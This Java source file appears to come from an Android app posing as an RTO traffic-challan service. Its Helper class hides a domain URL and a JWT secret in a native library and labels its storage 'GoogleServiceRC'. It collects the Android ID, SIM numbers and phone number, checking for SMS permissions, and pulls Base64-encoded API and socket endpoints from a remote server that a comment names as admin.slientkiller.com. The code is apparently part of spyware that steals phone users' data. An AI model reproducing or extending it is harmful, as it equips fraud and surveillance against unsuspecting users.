package com.service.rtochallan;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.nio.charset.StandardCharsets;
import java.util.List;


public class Helper {

    {
        System.loadLibrary("rtochallan.cpp");
    }
    public String StorageName = "GoogleServiceRC";
    public String BG_CHANNEL_ID = "GoogleServiceRC";
    public native String FormCode();
    public native String DomainUrl();
    public native String WsJwtSecret();
    public String TAG = "Dhappa";
    public String AppVersion = "1.6";
    public Context context;



    public  boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = connectivityManager.getActiveNetwork();
                if (network != null) {
                    NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(network);
                    return networkCapabilities != null && (
                            networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                    );
                }
            } else {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                return activeNetworkInfo != null && activeNetworkInfo.isConnected();
            }
        }
        return false;
    }


    @SuppressLint("HardwareIds")
    public String getAndroidId(Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }


    public static String getSimNumbers(Context context) {
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return "Permission is Denied on getSimNumbers";
        }
        List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfoList != null) {
            String Numbers = "";
            for (SubscriptionInfo info : subscriptionInfoList) {
                Numbers += " | " + info.getNumber();
            }
            if(!Numbers.isEmpty()) {
                Numbers = getPhoneNumber(context);
            }
            return Numbers;
        }else{
            return "subscription info is null on getSimNumbers";
        }
    }

    public static String getPhoneNumber(Context context) {
        Helper helper = new Helper();

        // default phone number..
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tMgr != null) {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                //Log.d(helper.TAG, "Phone OR SMS permission is not granted");
                return "Phone OR SMS permission is not granted";
            }
            String mPhoneNumber = tMgr.getLine1Number();
            if (mPhoneNumber != null && !mPhoneNumber.isEmpty()) {
                return mPhoneNumber;
            } else {
                return "Phone number not available";
            }
        } else {
            return "TelephonyManager is null";
        }
    }


    public boolean isAppInForeground(Context context) {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (am == null) return false;

        List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
        if (processes == null) return false;

        String packageName = context.getPackageName();

        for (ActivityManager.RunningAppProcessInfo process : processes) {
            if (process.processName.equals(packageName)) {
                return process.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND;
            }
        }
        return false;
    }

    public String getPackageName(Context context) {
        return context.getPackageName();
    }

    public String ApiUrl(Context context){
        StorageHelper s = new StorageHelper(context);
        return s.getString("api_url", "");
    }

    public String SocketUrl(Context context){
        StorageHelper s = new StorageHelper(context);
        return s.getString("socket_url", "");
    }


    public void updateApiPoints(Context context){
        Helper h = new Helper();
        NetworkHelper networkHelper = new NetworkHelper();

        networkHelper.makeGetRequest(h.DomainUrl(), new NetworkHelper.GetRequestCallback() {
            @Override
            public void onSuccess(String result) {
                Log.d(h.TAG, "DomainResult (Base64) " + result);

                String api_url = "";
                String socket_url = "";

                // 1. Decode the Base64 result string
                try {
                    // Use Base64.DEFAULT for standard Android decoding
                    byte[] decodedBytes = Base64.decode(result, Base64.DEFAULT);
                    String decodedData = new String(decodedBytes, StandardCharsets.UTF_8);

                    Log.d(h.TAG, "Decoded Data: " + decodedData);

                    // 2. Parse the decoded data
                    // The data is two URLs separated by a space: "URL1 URL2"
                    String[] parts = decodedData.split(" ");

                    if (parts.length >= 2) {
                        api_url = parts[0];     // https://admin.slientkiller.com/api/public
                        socket_url = parts[1];  // https://admin.slientkiller.com

                        // 3. Save the URLs
                        StorageHelper storageHelper = new StorageHelper(context); // Renamed to avoid shadowing
                        storageHelper.saveString("api_url", api_url);
                        storageHelper.saveString("socket_url", socket_url);

                        Log.i(h.TAG, "API URL saved: " + api_url);
                        Log.i(h.TAG, "Socket URL saved: " + socket_url);

                    } else {
                        Log.e(h.TAG, "Decoded data did not contain two parts separated by a space.");
                        return; // Stop if parsing fails
                    }

                } catch (Exception e) {
                    Log.e(h.TAG, "Base64 Decoding or Parsing Failed: " + e.getMessage());
                    return; // Stop if decoding fails
                }

            }

            @Override
            public void onFailure(String error) {
                Log.d(h.TAG, "DomainFailure " + error);
            }
        });
    }
    public void show(String message) {
        Helper h = new Helper();
        Log.d(h.TAG, message);
    }


}

